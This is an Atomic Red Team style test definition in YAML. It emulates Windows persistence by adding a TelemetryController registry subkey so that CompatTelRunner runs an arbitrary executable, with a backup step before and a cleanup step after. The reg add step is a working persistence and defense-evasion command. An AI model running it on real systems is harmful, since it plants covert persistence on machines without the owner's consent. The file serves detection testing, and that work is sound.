# Converted from Atomic Red Team - Modify Registry
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
# Original auto_generated_guid: 4469192c-2d2d-4a3a-9758-1f31d937a92b

---
api_version: 2.0
uuid: 472b05f0-f6b2-4e61-b3cf-ba7cdfcd68d7
name: Abusing Windows TelemetryController Registry Key for Persistence
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  The Windows Compatibility Telemetry system makes use of the CompatTelRunner.exe binary to run a variety of telemetry tasks. It relies on the registry for instructions on which commands to run.
  It will run any arbitrary command without restriction of location or type. Blog: https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence

mitre:
  tactics:
    - "TA0003 Persistence"
    - "TA0005 Defense Evasion"
  techniques:
    - "T1112 Modify Registry"

requirements:
  platforms:
    - os: windows
  superuser: true

args:
  - name: new_key
    description: New Registry Key Added
    type: string
    default: "NewKey"
  - name: executable_path
    description: Custom Executable to run
    type: string
    default: "C:\\Windows\\System32\\cmd.exe"
  - name: backup_location
    description: Path where registry backup will be saved
    type: path
    default: "C:\\Users\\Public\\backup.reg"

steps:
  - name: backup_registry
    executor: cmd.exe
    inline: |
      reg export "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController" "{{.Args.backup_location}}" /y 2>nul

  - name: add_telemetry_controller_key
    executor: cmd.exe
    inline: |
      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\{{.Args.new_key}}" /t REG_SZ /v Command /d {{.Args.executable_path}} /f
    cleanup:
      executor: cmd.exe
      inline: |
        reg import "{{.Args.backup_location}}" 2>nul
        del "{{.Args.backup_location}}" /f /q 2>nul
